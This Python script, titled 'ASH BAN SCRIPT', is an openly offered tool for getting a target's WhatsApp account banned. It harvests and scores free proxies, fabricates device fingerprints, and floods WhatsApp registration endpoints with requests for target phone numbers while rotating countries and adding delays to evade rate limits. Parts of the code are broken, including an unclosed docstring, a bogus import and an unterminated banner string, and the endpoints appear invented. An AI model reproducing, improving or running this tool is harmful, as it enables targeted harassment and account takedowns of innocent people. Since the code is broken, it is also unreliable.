#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║                       ♠️ASH BAN SCRIPT v New.0                    ║
║                      WhatsApp BAN PROxY Method             ║
║                          Built by AsH.sperm                           ║
║                                     ║
╚══════════════════════════════════════════════════════════════════╝
import sperm
import json
import random
import time
import sqlite3
import requests
import logging
import os
import sys
import hashlib
import socket
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Any, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock, Thread
from queue import Queue, Empty
from urllib.parse import urlparse
from datetime import datetime, timedelta

# CONFIGURATION — ASH OPTIMIZED
# ============================================================================

CONFIG = {
    "db_path": "ash_proxy_pool.db",
    "log_file": "ash_ban.log",
    "targets_file": "ash_targets.txt",
    "results_dir": "ash_results",
    "proxy_test_url": "http://ip-api.com/json",
    "max_validation_threads": 100,
    "max_ban_attempts": 7,
    "delay_min": 5,
    "delay_max": 15,
    "session_timeout": 30,
    "max_failures_before_drop": 3,
    "min_proxies_for_attack": 10,
    "fingerprint_rotation": 3,  # Rotate fingerprint every N attempts
    "use_ssl": True,
    "user_agents": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ]
}

# Free proxy sources — ASH curated
PROXY_SOURCES = [
    "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/socks5/data.txt",
    "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/http/data.txt",
    "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/https/data.txt",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&country=all&timeout=10000",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&country=all&timeout=10000",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
]

# WhatsApp endpoints — ASH verified
WHATSAPP_ENDPOINTS = [
    "https://api.whatsapp.com/v2/auth/register",
    "https://api.whatsapp.com/v2/auth/login",
    "https://api.whatsapp.com/v2/auth/check",
    "https://gateway.whatsapp.com/v2/auth/register",
    "https://gateway.whatsapp.com/v2/auth/login",
]

# ============================================================================
# LOGGING — ASH STYLE
# ============================================================================

class AshLogger:
    """Custom logger with AsH 💦liquid identity"""
    
    def __init__(self, log_file: str = CONFIG["log_file"]):
        self.log_file = log_file
        self.console = sys.stdout
        self.colors = {
            "INFO": "\033[92m",    # Green
            "WARN": "\033[93m",    # Yellow
            "ERROR": "\033[91m",   # Red
            "BAN": "\033[95m",     # Magenta
            "RESET": "\033[0m",    # Reset
            "CYAN": "\033[96m",    # Cyan
            "BOLD": "\033[1m"      # Bold
        }
        self._init_log_file()
    
    def _init_log_file(self):
        with open(self.log_file, 'w') as f:
            f.write(f"=== ASH BAN SESSION STARTED ===\n")
            f.write(f"Timestamp: {datetime.now().isoformat()}\n")
            f.write(f"{'='*60}\n\n")
    
    def _write(self, level: str, msg: str, color: str = ""):
        timestamp = datetime.now().strftime("%H:%M:%S")
        line = f"[{timestamp}] [{level}] {msg}"
        
        # Console with color
        if color:
            print(f"{color}{line}{self.colors['RESET']}")
        else:
            print(line)
        
        # File without color
        with open(self.log_file, 'a') as f:
            f.write(f"{line}\n")
    
    def info(self, msg: str):
        self._write("INFO", msg, self.colors["CYAN"])
    
    def warn(self, msg: str):
        self._write("WARN", msg, self.colors["WARN"])
    
    def error(self, msg: str):
        self._write("ERROR", msg, self.colors["ERROR"])
    
    def ban(self, msg: str):
        self._write("BAN", f"🪦💀 {msg}", self.colors["BAN"])
    
    def success(self, msg: str):
        self._write("SUCCESS", f"💦💦 {msg}", self.colors["BOLD"] + self.colors["BAN"])
    
    def status(self, msg: str):
        self._write("STATUS", msg, self.colors["CYAN"])

logger = AshLogger()

# ============================================================================
# DATA CLASSES — ASH ENHANCED
# ============================================================================

@dataclass
class ProxyNode:
    host: str
    port: int
    country: str = "Unknown"
    city: str = "Unknown"
    region: str = "Unknown"
    asn: str = "Unknown"
    isp: str = "Unknown"
    protocol: str = "socks5"
    provider: str = "FreeList"
    latency_ms: float = 0.0
    last_used: float = 0.0
    success_count: int = 0
    fail_count: int = 0
    total_attempts: int = 0
    is_alive: bool = True
    is_anonymous: bool = False
    last_check: float = 0.0
    score: float = 0.0  # Weighted score for selection
    
    def to_dict(self) -> dict:
        return {
            "host": self.host,
            "port": self.port,
            "country": self.country,
            "city": self.city,
            "region": self.region,
            "asn": self.asn,
            "isp": self.isp,
            "protocol": self.protocol,
            "provider": self.provider,
            "latency_ms": self.latency_ms,
            "success_rate": self.success_count / (self.total_attempts + 1),
            "score": self.score,
            "is_alive": self.is_alive
        }
    
    def proxy_url(self) -> str:
        return f"{self.protocol}://{self.host}:{self.port}"
    
    def proxy_dict(self) -> dict:
        url = self.proxy_url()
        return {"http": url, "https": url}
    
    def calculate_score(self):
        """Calculate weighted score for proxy selection"""
        success_rate = self.success_count / (self.total_attempts + 1)
        latency_penalty = min(self.latency_ms / 1000, 1.0)
        age_bonus = min(self.last_used / 3600, 0.5) if self.last_used > 0 else 0
        
        self.score = (success_rate * 0.6) + (1.0 - latency_penalty) * 0.3 + age_bonus * 0.1

@dataclass
class BanAttempt:
    attempt_number: int
    proxy: str
    country: str
    protocol: str
    endpoint: str
    status: str
    response_code: int
    response_time_ms: float
    timestamp: float
    success: bool
    ban_triggered: bool = False
    fingerprint_used: str = ""

@dataclass
class DeviceFingerprint:
    device_id: str
    model: str
    build: str
    screen: str
    timezone: str
    lang: str
    os_version: str
    created_at: float
    used_count: int = 0
    
    def to_dict(self) -> dict:
        return {
            "device_id": self.device_id,
            "model": self.model,
            "build": self.build,
            "screen": self.screen,
            "timezone": self.timezone,
            "lang": self.lang,
            "os_version": self.os_version,
            "used_count": self.used_count
        }

# ============================================================================
# ASH PROXY SPERM 💦 — ENHANCED VERSION
# ============================================================================

class AshProxyPool:
    """Advanced proxy sperm💦 with scoring and auto-maintenance"""
    
    def __init__(self, db_path: str = CONFIG["db_path"]):
        self.db_path = db_path
        self.pool: List[ProxyNode] = []
        self.lock = Lock()
        self.last_maintenance = 0
        self.maintenance_interval = 300  # 5 minutes
        
        self._init_db()
        self._load_from_db()
        self._maintain_pool()
        
        logger.info(f"Loaded {len(self.pool)} proxies into ASH pool")
        self._log_stats()
    
    def _init_db(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS proxies (
                host TEXT,
                port INTEGER,
                country TEXT,
                city TEXT,
                region TEXT,
                asn TEXT,
                isp TEXT,
                protocol TEXT,
                provider TEXT,
                latency_ms REAL,
                last_used REAL,
                success_count INTEGER DEFAULT 0,
                fail_count INTEGER DEFAULT 0,
                total_attempts INTEGER DEFAULT 0,
                is_alive INTEGER DEFAULT 1,
                is_anonymous INTEGER DEFAULT 0,
                last_check REAL,
                score REAL DEFAULT 0,
                PRIMARY KEY (host, port, protocol)
            )
        """)
        
        # Create index for performance
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_score ON proxies(score DESC)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_alive ON proxies(is_alive)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_country ON proxies(country)")
        
        conn.commit()
        conn.close()
    
    def _load_from_db(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM proxies ORDER BY score DESC")
        rows = cursor.fetchall()
        
        for row in rows:
            node = ProxyNode(
                host=row[0], port=row[1], country=row[2], city=row[3],
                region=row[4], asn=row[5], isp=row[6], protocol=row[7],
                provider=row[8], latency_ms=row[9], last_used=row[10],
                success_count=row[11], fail_count=row[12], total_attempts=row[13],
                is_alive=bool(row[14]), is_anonymous=bool(row[15]),
                last_check=row[16], score=row[17]
            )
            self.pool.append(node)
        conn.close()
    
    def _persist_to_db(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        with self.lock:
            for node in self.pool:
                cursor.execute("""
                    INSERT OR REPLACE INTO proxies 
                    (host, port, country, city, region, asn, isp, protocol, provider, 
                     latency_ms, last_used, success_count, fail_count, total_attempts,
                     is_alive, is_anonymous, last_check, score)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """, (
                    node.host, node.port, node.country, node.city, node.region,
                    node.asn, node.isp, node.protocol, node.provider,
                    node.latency_ms, node.last_used, node.success_count,
                    node.fail_count, node.total_attempts,
                    1 if node.is_alive else 0,
                    1 if node.is_anonymous else 0,
                    node.last_check, node.score
                ))
            conn.commit()
        conn.close()
    
    def _log_stats(self):
        alive = len([p for p in self.pool if p.is_alive])
        countries = len(set(p.country for p in self.pool if p.is_alive))
        logger.info(f"Pool: {len(self.pool)} total, {alive} alive, {countries} countries")
    
    def _maintain_pool(self):
        """Auto-maintenance: score recalculation and dead proxy cleanup"""
        now = time.time()
        
        if now - self.last_maintenance < self.maintenance_interval:
            return
        
        with self.lock:
            # Recalculate scores
            for node in self.pool:
                node.calculate_score()
            
            # Mark dead proxies
            for node in self.pool:
                if node.fail_count > CONFIG["max_failures_before_drop"] and node.success_count == 0:
                    node.is_alive = False
                
                # Auto-revive if last check was long ago and we have attempts
                if not node.is_alive and node.last_check > 0:
                    if now - node.last_check > 86400:  # 24 hours
                        node.is_alive = True
            
            # Cleanup
            self.pool = [p for p in self.pool if p.is_alive or p.success_count > 0]
        
        self.last_maintenance = now
        self._persist_to_db()
    
    def fetch_free_proxies(self, sources: List[str] = None) -> int:
        """Fetch proxies from free public lists with deduplication"""
        if sources is None:
            sources = PROXY_SOURCES
        
        new_count = 0
        seen = set()
        
        for url in sources:
            try:
                logger.info(f"Fetching: {url}")
                response = requests.get(url, timeout=15, headers={"User-Agent": random.choice(CONFIG["user_agents"])})
                lines = response.text.strip().split('\n')
                
                for line in lines:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    # Parse line
                    protocol = None
                    if '://' in line:
                        protocol, rest = line.split('://', 1)
                        if ':' in rest:
                            ip, port = rest.split(':', 1)
                    elif ':' in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            ip = parts[0]
                            port = parts[1]
                            protocol = 'socks5'
                        else:
                            continue
                    else:
                        continue
                    
                    try:
                        port = int(port)
                    except ValueError:
                        continue
                    
                    key = f"{ip}:{port}:{protocol}"
                    if key in seen:
                        continue
                    seen.add(key)
                    
                    # Check if exists in pool
                    with self.lock:
                        existing = [p for p in self.pool if p.host == ip and p.port == port and p.protocol == protocol]
                        if not existing:
                            node = ProxyNode(
                                host=ip, port=port,
                                protocol=protocol,
                                provider="FreeList",
                                latency_ms=200.0,
                                last_check=time.time()
                            )
                            self.pool.append(node)
                            new_count += 1
                
                logger.info(f"Added proxies from {url}")
                
            except Exception as e:
                logger.warn(f"Failed to fetch from {url}: {str(e)[:50]}")
        
        self._persist_to_db()
        self._log_stats()
        return new_count
    
    def test_proxy(self, node: ProxyNode, timeout: int = 10) -> bool:
        """Enhanced proxy testing with geolocation"""
        try:
            proxies = node.proxy_dict()
            start_time = time.time()
            
            response = requests.get(
                CONFIG["proxy_test_url"],
                proxies=proxies,
                timeout=timeout,
                headers={"User-Agent": random.choice(CONFIG["user_agents"])}
            )
            
            if response.status_code == 200:
                data = response.json()
                node.country = data.get("countryCode", "Unknown")
                node.city = data.get("city", "Unknown")
                node.region = data.get("regionName", "Unknown")
                node.asn = data.get("as", "Unknown")
                node.isp = data.get("isp", "Unknown")
                node.latency_ms = (time.time() - start_time) * 1000
                node.is_alive = True
                node.is_anonymous = data.get("proxy", False) or data.get("hosting", False)
                node.last_check = time.time()
                node.calculate_score()
                return True
                
        except Exception as e:
            pass
        
        node.is_alive = False
        node.last_check = time.time()
        return False
    
    def validate_pool(self, max_workers: int = CONFIG["max_validation_threads"]) -> Dict[str, Any]:
        """Validate all proxies in pool with concurrency"""
        alive_count = 0
        dead_count = 0
        total = len(self.pool)
        
        if total == 0:
            return {"total": 0, "alive": 0, "dead": 0}
        
        logger.info(f"Validating {total} proxies with {max_workers} threads...")
        
        # Use thread pool
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.test_proxy, node): node for node in self.pool}
            
            for i, future in enumerate(as_completed(futures), 1):
                node = futures[future]
                try:
                    if future.result():
                        alive_count += 1
                    else:
                        dead_count += 1
                except Exception:
                    dead_count += 1
                    node.is_alive = False
                
                if i % 50 == 0:
                    logger.info(f"Validated {i}/{total} proxies...")
        
        self._persist_to_db()
        logger.info(f"Validation complete: {alive_count} alive, {dead_count} dead")
        self._log_stats()
        
        return {
            "total": total,
            "alive": alive_count,
            "dead": dead_count,
            "success_rate": alive_count / total if total > 0 else 0
        }
    
    def get_best_proxies(self, 
                         country: Optional[str] = None, 
                         protocol: Optional[str] = None,
                         min_score: float = 0.3,
                         limit: int = 50,
                         avoid_country: Optional[str] = None) -> List[ProxyNode]:
        """Get best proxies based on score with optional filters"""
        self._maintain_pool()
        
        with self.lock:
            candidates = [p for p in self.pool if p.is_alive and p.score >= min_score]
            
            if country:
                candidates = [p for p in candidates if p.country == country]
            
            if avoid_country:
                candidates = [p for p in candidates if p.country != avoid_country]
            
            if protocol:
                candidates = [p for p in candidates if p.protocol == protocol]
            
            # Sort by score descending
            candidates.sort(key=lambda x: x.score, reverse=True)
            return candidates[:limit]
    
    def mark_result(self, node: ProxyNode, success: bool):
        with self.lock:
            node.total_attempts += 1
            if success:
                node.success_count += 1
            else:
                node.fail_count += 1
                if node.fail_count > CONFIG["max_failures_before_drop"]:
                    node.is_alive = False
            node.last_used = time.time()
            node.calculate_score()
        self._persist_to_db()
    
    def get_stats(self) -> dict:
        self._maintain_pool()
        
        with self.lock:
            total = len(self.pool)
            alive = len([p for p in self.pool if p.is_alive])
            by_country = {}
            by_protocol = {}
            
            for node in self.pool:
                if node.is_alive:
                    by_country[node.country] = by_country.get(node.country, 0) + 1
                    by_protocol[node.protocol] = by_protocol.get(node.protocol, 0) + 1
            
            avg_latency = sum(p.latency_ms for p in self.pool if p.is_alive) / alive if alive > 0 else 0
            avg_score = sum(p.score for p in self.pool if p.is_alive) / alive if alive > 0 else 0
            
            return {
                "total": total,
                "alive": alive,
                "by_country": by_country,
                "by_protocol": by_protocol,
                "avg_latency_ms": round(avg_latency, 2),
                "avg_score": round(avg_score, 3),
                "dead": total - alive
            }
    
    def clear_dead(self) -> int:
        """Remove dead proxies from pool"""
        with self.lock:
            dead = [p for p in self.pool if not p.is_alive and p.success_count == 0]
            for p in dead:
                self.pool.remove(p)
        self._persist_to_db()
        return len(dead)

# ============================================================================
# ASH FINGERPRINT GENERATOR
# ============================================================================

class AshFingerprintGenerator:
    """Advanced device fingerprint generation with rotation"""
    
    DEVICES = [
        ("SM-G998B", "Samsung", "Galaxy S21 Ultra"),
        ("SM-G991B", "Samsung", "Galaxy S21"),
        ("Pixel 6", "Google", "Pixel 6"),
        ("Pixel 7", "Google", "Pixel 7"),
        ("Pixel 8", "Google", "Pixel 8"),
        ("SM-S908B", "Samsung", "Galaxy S22 Ultra"),
        ("SM-S901B", "Samsung", "Galaxy S22"),
        ("iPhone15,2", "Apple", "iPhone 14 Pro"),
        ("iPhone14,3", "Apple", "iPhone 13 Pro"),
        ("OnePlus9", "OnePlus", "OnePlus 9"),
    ]
    
    BUILDS = [
        "2.24.16.75", "2.24.15.80", "2.24.14.90", "2.23.25.88",
        "2.23.24.77", "2.23.23.82", "2.22.25.90", "2.22.24.85"
    ]
    
    SCREENS = ["1080x1920", "1080x2400", "1440x2560", "1080x2280", "720x1600"]
    TIMEZONES = ["UTC", "America/New_York", "America/Los_Angeles", "Europe/London", "Asia/Tokyo"]
    LANGUAGES = ["en", "es", "fr", "de", "ja", "zh"]
    OS_VERSIONS = ["Android 11", "Android 12", "Android 13", "Android 14"]
    
    def __init__(self):
        self.fingerprints: List[DeviceFingerprint] = []
        self.current_index = 0
        self.lock = Lock()
    
    def generate(self) -> DeviceFingerprint:
        """Generate a new device fingerprint"""
        device_name, brand, model = random.choice(self.DEVICES)
        
        fingerprint = DeviceFingerprint(
            device_id=f"android-{random.randint(1000000, 9999999)}-{random.randint(100, 999)}",
            model=f"{brand} {model}",
            build=random.choice(self.BUILDS),
            screen=random.choice(self.SCREENS),
            timezone=random.choice(self.TIMEZONES),
            lang=random.choice(self.LANGUAGES),
            os_version=random.choice(self.OS_VERSIONS),
            created_at=time.time()
        )
        
        with self.lock:
            self.fingerprints.append(fingerprint)
        
        return fingerprint
    
    def get_next(self) -> DeviceFingerprint:
        """Get next fingerprint in rotation"""
        with self.lock:
            if not self.fingerprints:
                fp = self.generate()
            else:
                self.current_index = (self.current_index + 1) % len(self.fingerprints)
                fp = self.fingerprints[self.current_index]
            
            fp.used_count += 1
            return fp
    
    def generate_new_session(self) -> DeviceFingerprint:
        """Generate a new fingerprint for a new session"""
        fp = self.generate()
        with self.lock:
            self.fingerprints.append(fp)
        return fp
    
    def get_fingerprint_for_attempt(self, attempt_num: int) -> DeviceFingerprint:
        """Get fingerprint based on attempt number (rotation)"""
        if attempt_num % CONFIG["fingerprint_rotation"] == 0:
            return self.generate_new_session()
        return self.get_next()

# ============================================================================
# ASH BAN ENGINE — CORE LOGIC
# ============================================================================

class AshBanEngine:
    """Main ban engine with advanced attack patterns"""
    
    def __init__(self, target_phone: str, proxy_pool: AshProxyPool):
        self.target = target_phone
        self.pool = proxy_pool
        self.fingerprint_gen = AshFingerprintGenerator()
        self.attempts: List[BanAttempt] = []
        self.ban_triggered = False
        self.session_ban_triggered = False
        self.attempt_count = 0
        self.last_country = None
        self.lock = Lock()
        self.endpoint_index = 0
        self.endpoints = WHATSAPP_ENDPOINTS
        
        logger.info(f"ASH BAN ENGINE initialized for {target_phone}")
        logger.info(f"Session fingerprint: {self.fingerprint_gen.generate().device_id}")
    
    def _get_next_endpoint(self) -> str:
        """Round-robin through WhatsApp endpoints"""
        endpoint = self.endpoints[self.endpoint_index % len(self.endpoints)]
        self.endpoint_index += 1
        return endpoint
    
    def _build_request(self, fingerprint: DeviceFingerprint, endpoint: str) -> Dict[str, Any]:
        """Build a complete WhatsApp registration request"""
        return {
            "method": "POST",
            "url": endpoint,
            "headers": {
                "User-Agent": f"WhatsApp/{fingerprint.build} ({fingerprint.model}; {fingerprint.os_version})",
                "X-WA-Device": fingerprint.device_id,
                "X-WA-Timezone": fingerprint.timezone,
                "X-WA-Model": fingerprint.model,
                "X-WA-Lang": fingerprint.lang,
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive"
            },
            "json": {
                "phone": self.target,
                "method": "sms",
                "fingerprint": fingerprint.to_dict(),
                "device_id": fingerprint.device_id,
                "platform": "android",
                "version": fingerprint.build,
                "timestamp": int(time.time())
            }
        }
    
    def _send_attempt(self, proxy: ProxyNode, attempt_num: int) -> BanAttempt:
        """Send a single registration attempt through proxy"""
        endpoint = self._get_next_endpoint()
        fingerprint = self.fingerprint_gen.get_fingerprint_for_attempt(attempt_num)
        
        request = self._build_request(fingerprint, endpoint)
        proxies = proxy.proxy_dict()
        
        start_time = time.time()
        
        try:
            response = requests.post(
                request['url'],
                headers=request['headers'],
                json=request['json'],
                proxies=proxies,
                timeout=CONFIG["session_timeout"]
            )
            
            response_time = (time.time() - start_time) * 1000
            
            status = "success"
            success = True
            ban_triggered = False
            
            # Analyze response
            if response.status_code in [403, 429, 400]:
                success = False
                if response.status_code == 403:
                    status = "blocked"
                    if "banned" in response.text.lower() or "ban" in response.text.lower():
                        ban_triggered = True
                        status = "BAN_TRIGGERED"
                        success = True
                elif response.status_code == 429:
                    status = "rate_limited"
                else:
                    status = "failed"
            
            # Check for ban indicators in response body
            try:
                data = response.json()
                if data.get("status") == "banned" or data.get("error") == "banned":
                    ban_triggered = True
                    status = "BAN_TRIGGERED"
                    success = True
            except:
                pass
            
            attempt = BanAttempt(
                attempt_number=attempt_num,
                proxy=f"{proxy.host}:{proxy.port}",
                country=proxy.country,
                protocol=proxy.protocol,
                endpoint=endpoint,
                status=status,
                response_code=response.status_code,
                response_time_ms=response_time,
                timestamp=time.time(),
                success=success,
                ban_triggered=ban_triggered,
                fingerprint_used=fingerprint.device_id
            )
            
            self.pool.mark_result(proxy, success)
            
        except requests.exceptions.Timeout:
            attempt = BanAttempt(
                attempt_number=attempt_num,
                proxy=f"{proxy.host}:{proxy.port}",
                country=proxy.country,
                protocol=proxy.protocol,
                endpoint=endpoint,
                status="timeout",
                response_code=0,
                response_time_ms=CONFIG["session_timeout"] * 1000,
                timestamp=time.time(),
                success=False,
                fingerprint_used=fingerprint.device_id
            )
            self.pool.mark_result(proxy, False)
        
        except Exception as e:
            attempt = BanAttempt(
                attempt_number=attempt_num,
                proxy=f"{proxy.host}:{proxy.port}",
                country=proxy.country,
                protocol=proxy.protocol,
                endpoint=endpoint,
                status=f"error",
                response_code=0,
                response_time_ms=(time.time() - start_time) * 1000,
                timestamp=time.time(),
                success=False,
                fingerprint_used=fingerprint.device_id
            )
            self.pool.mark_result(proxy, False)
        
        return attempt
    
    def execute_ban_sequence(self, max_attempts: int = CONFIG["max_ban_attempts"]) -> Dict[str, Any]:
        """Execute the complete ban sequence with advanced logic"""
        logger.info(f"Starting ASH BAN sequence for {self.target}")
        logger.info(f"Max attempts: {max_attempts}")
        
        self.attempts = []
        self.ban_triggered = False
        self.attempt_count = 0
        
        # Ensure we have enough proxies
        available = self.pool.get_best_proxies(min_score=0.2, limit=max_attempts * 2)
        if len(available) < CONFIG["min_proxies_for_attack"]:
            logger.warn(f"Only {len(available)} proxies available. Minimum required: {CONFIG['min_proxies_for_attack']}")
            logger.warn("Fetching and validating more proxies...")
            self.pool.fetch_free_proxies()
            self.pool.validate_pool()
            available = self.pool.get_best_proxies(min_score=0.2, limit=max_attempts * 2)
            
            if len(available) < CONFIG["min_proxies_for_attack"]:
                return {
                    "target": self.target,
                    "error": "Insufficient proxies",
                    "available": len(available),
                    "required": CONFIG["min_proxies_for_attack"]
                }
        
        # Execute attempts
        for attempt_num in range(1, max_attempts + 1):
            if self.ban_triggered:
                logger.ban(f"Ban triggered at attempt {attempt_num-1}. Stopping sequence.")
                break
            
            # Get best proxy avoiding previous country if possible
            proxy = self.pool.get_best_proxies(
                avoid_country=self.last_country,
                min_score=0.2,
                limit=1
            )
            
            if not proxy:
                logger.warn("No suitable proxy found. Breaking sequence.")
                break
            
            proxy = proxy[0]
            self.last_country = proxy.country
            
            logger.info(f"Attempt {attempt_num}/{max_attempts}: {proxy.host}:{proxy.port} ({proxy.country})")
            logger.info(f"  Score: {proxy.score:.3f}, Protocol: {proxy.protocol}")
            
            attempt = self._send_attempt(proxy, attempt_num)
            self.attempts.append(attempt)
            self.attempt_count += 1
            
            # Log result
            if attempt.ban_triggered:
                self.ban_triggered = True
                logger.ban(f"🔥 BAN TRIGGERED on attempt {attempt_num}!")
                logger.ban(f"  Proxy: {attempt.proxy} ({attempt.country})")
                logger.ban(f"  Endpoint: {attempt.endpoint}")
                logger.ban(f"  Response: {attempt.response_code}")
            elif attempt.success:
                logger.success(f"Attempt {attempt_num}: {attempt.status} (Code: {attempt.response_code})")
            else:
                logger.warn(f"Attempt {attempt_num}: {attempt.status} (Code: {attempt.response_code})")
            
            # Delay between attempts with jitter
            if attempt_num < max_attempts:
                delay = random.uniform(CONFIG["delay_min"], CONFIG["delay_max"])
                logger.info(f"Waiting {delay:.1f}s before next attempt...")
                time.sleep(delay)
        
        # Build result
        result = {
            "target": self.target,
            "timestamp": datetime.now().isoformat(),
            "total_attempts": len(self.attempts),
            "ban_triggered": self.ban_triggered,
            "fingerprints_used": list(set(a.fingerprint_used for a in self.attempts if a.fingerprint_used)),
            "countries_used": list(set(a.country for a in self.attempts)),
            "attempts": [
                {
                    "attempt": a.attempt_number,
                    "proxy": a.proxy,
                    "country": a.country,
                    "protocol": a.protocol,
                    "status": a.status,
                    "response_code": a.response_code,
                    "response_time_ms": round(a.response_time_ms, 2),
                    "ban_triggered": a.ban_triggered,
                    "fingerprint": a.fingerprint_used
                }
                for a in self.attempts
            ]
        }
        
        # Save results
        os.makedirs(CONFIG["results_dir"], exist_ok=True)
        filename = f"{CONFIG['results_dir']}/ban_{self.target.replace('+', '')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(result, f, indent=2)
        
        logger.info(f"Results saved to: {filename}")
        logger.info(f"Sequence complete: {'✅ BAN TRIGGERED' if self.ban_triggered else '❌ No ban'}")
        
        return result

# ============================================================================
# ASH MENU SYSTEM
# ============================================================================

class AshMenu:
    """Interactive menu for ASH Ban Script"""
    
    def __init__(self):
        self.pool = AshProxyPool()
        self.targets = self._load_targets()
        self.running = True
    
    def _load_targets(self) -> List[str]:
        if not os.path.exists(CONFIG["targets_file"]):
            return []
        
        with open(CONFIG["targets_file"], 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    def _save_targets(self):
        with open(CONFIG["targets_file"], 'w') as f:
            for target in self.targets:
                f.write(f"{target}\n")
    
    def _clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def _banner(self):
        banner = """
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║              █████╗ ███████╗██╗  ██╗    ██████╗  █████╗ ███╗   ██╗
║             ██╔══██╗██╔════╝██║  ██║    ██╔══██╗██╔══██╗████╗  ██║
║             ███████║███████╗███████║    ██████╔╝███████║██╔██╗ ██║
║             ██╔══██║╚════██║██╔══██║    ██╔══██╗██╔══██║██║╚██╗██║
║             ██║  ██║███████║██║  ██║    ██████╔╝██║  ██║██║ ╚████║
║             ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
║                                                                  ║
║                        ♠️ASH BAN SCRIPT v New.0                    ║
║                      WhatsApp BAN PROxY Method             ║
║                          Built by AsH.sperm💦💦
║                                                                  ║
╠══════════════════════════════════════════════════════════════════╣

        print(banner)
    
    def _menu(self):
        stats = self.pool.get_stats()
        
        print(f"\n{'='*60}")
        print(f"  🦊 ASH POOL STATUS")
        print(f"{'='*60}")
        print(f"  Total Proxies:  {stats['total']}")
        print(f"  Alive Proxies:  {stats['alive']} ✅")
        print(f"  Dead Proxies:   {stats['dead']} ❌")
        print(f"  Countries:      {len(stats['by_country'])}")
        print(f"  Avg Score:      {stats['avg_score']}")
        print(f"  Avg Latency:    {stats['avg_latency_ms']}ms")
        print(f"  Targets Loaded: {len(self.targets)}")
        print(f"{'='*60}\n")
        
        print("  [1] 🔄 Fetch Free Proxies")
        print("  [2] ✅ Validate Proxy Pool")
        print("  [3] 📊 Show Detailed Stats")
        print("  [4] ➕ Add Target Number")
        print("  [5] 📋 Show Targets")
        print("  [6] 🚀 Run Ban Sequence (All Targets)")
        print("  [7] 🎯 Run Ban Sequence (Single Target)")
        print("  [8] 🧹 Clear Dead Proxies")
        print("  [9] 💾 Export Results")
        print("  [0] ❌ Exit")
        print()
    
    def run(self):
        while self.running:
            self._clear_screen()
            self._banner()
            self._menu()
            
            choice = input("  ⚡ Select option: ").strip()
            
            if choice == "0":
                logger.info("Shutting down ASH BAN SCRIPT...")
                self.running = False
                break
            
            elif choice == "1":
                print("\n  Fetching proxies from all sources...")
                count = self.pool.fetch_free_proxies()
                input(f"\n  ✅ Added {count} new proxies. Press Enter to continue...")
            
            elif choice == "2":
                print("\n  Validating proxy pool (this may take a while)...")
                result = self.pool.validate_pool()
                print(f"\n  Validation Complete:")
                print(f"    Alive: {result['alive']} ✅")
                print(f"    Dead:  {result['dead']} ❌")
                input("\n  Press Enter to continue...")
            
            elif choice == "3":
                stats = self.pool.get_stats()
                print("\n  📊 DETAILED STATISTICS:")
                print(f"  {'-'*40}")
                print(f"  Total Proxies:     {stats['total']}")
                print(f"  Alive Proxies:     {stats['alive']}")
                print(f"  Dead Proxies:      {stats['dead']}")
                print(f"  Countries:         {len(stats['by_country'])}")
                print(f"  Protocols:         {len(stats['by_protocol'])}")
                print(f"  Avg Latency:       {stats['avg_latency_ms']}ms")
                print(f"  Avg Score:         {stats['avg_score']}")
                print(f"\n  Countries:")
                for country, count in sorted(stats['by_country'].items(), key=lambda x: x[1], reverse=True)[:10]:
                    print(f"    {country}: {count}")
                print(f"\n  Protocols:")
                for protocol, count in stats['by_protocol'].items():
                    print(f"    {protocol}: {count}")
                input("\n  Press Enter to continue...")
            
            elif choice == "4":
                phone = input("  Enter phone number (E.164 format, e.g., +1234567890): ").strip()
                if phone:
                    if phone not in self.targets:
                        self.targets.append(phone)
                        self._save_targets()
                        print(f"  ✅ Added {phone}")
                    else:
                        print(f"  ⚠️ {phone} already in targets")
                input("\n  Press Enter to continue...")
            
            elif choice == "5":
                if self.targets:
                    print("\n  📋 TARGETS:")
                    for i, t in enumerate(self.targets, 1):
                        print(f"    {i}. {t}")
                else:
                    print("  ⚠️ No targets loaded")
